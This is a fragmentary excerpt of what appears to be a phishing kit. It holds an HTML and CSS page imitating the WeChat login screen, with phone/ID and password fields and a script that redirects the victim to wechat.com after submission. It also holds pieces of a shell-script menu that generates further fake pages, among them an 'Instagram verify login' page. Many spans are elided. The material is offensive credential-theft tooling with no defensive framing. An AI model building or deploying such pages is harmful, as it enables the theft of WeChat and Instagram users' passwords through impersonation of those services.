...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif; background: #f8f8f8; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background: #fff; width: 360px; padding: 40px 24px; text-align: center; border-radius: 0; }
        .logo { width: 48px; height: 48px; margin-bottom: 24px; }
        h1 { font-size: 20px; color: #000; margin-bottom: 32px; font-weight: 500; }
        .form-group { margin-bottom: 16px; }
        input { width: 100%; height: 48px; padding: 0 16px; border: 1px solid #e6e6e6; border-radius: 8px; font-size: 17px; background: #f8f8f8; }
        input:focus { outline: none; background: #fff; border-color: #07c160; }
        .btn-login { width: 100%; height: 48px; background: #07c160; color: #fff; font-size: 17px; border-radius: 8px; border: none; margin: 24px 0; }
        .btn-login:active { background: #059c4d; }
        .links { font-size: 15px; margin: 16px 0; }
        .links a { color: #576b95; text-decoration: none; }
        .divider { color: #8e8e93; margin: 24px 0; position: relative; }
        .divider::before { content: ""; position: absolute; top: 50%; left: 0; right: 0; border-top: 1px solid #e6e6e6; }
        .divider span { background: #fff; padding: 0 16px; position: relative; }
        .qrcode-login { color: #07c160; text-decoration: none; font-size: 15px; display: block; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://dev-dfprotection.pantheonsite.io/wp-content/uploads/2025/03/Screenshot_20250315_215203_Google.jpg" class="logo" alt="WeChat">
        <h1>Log In to WeChat</h1>
        
        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="username" placeholder="Phone/WeChat ID/Email" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
        ...
        <div class="links">
            <a href="#">Switch Account</a> · <a href="#">More Options</a>
        </div>

        <div class="divider"><span>Or</span></div>
        
        <a href="#" class="qrcode-login">Log in with QR Code</a>
    </div>
    ...
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            ...
            try {
                ...
                window.location.href = 'https://wechat.com/redirect'; // Replace with your redirect URL
            } catch (error) {
...
show_menu() {
    ...
    echo -e "${BLUE}[18] Instagram documentation login${NC}"        
...
case $choice in
    ...
    17)                                          # إضافة جديدة
        ...
        ;;
    18)                                          
        page="Instagram_verify_login"
        create_page "$page" "$(instagram_verify_page)"
        ;;
    19)                                          
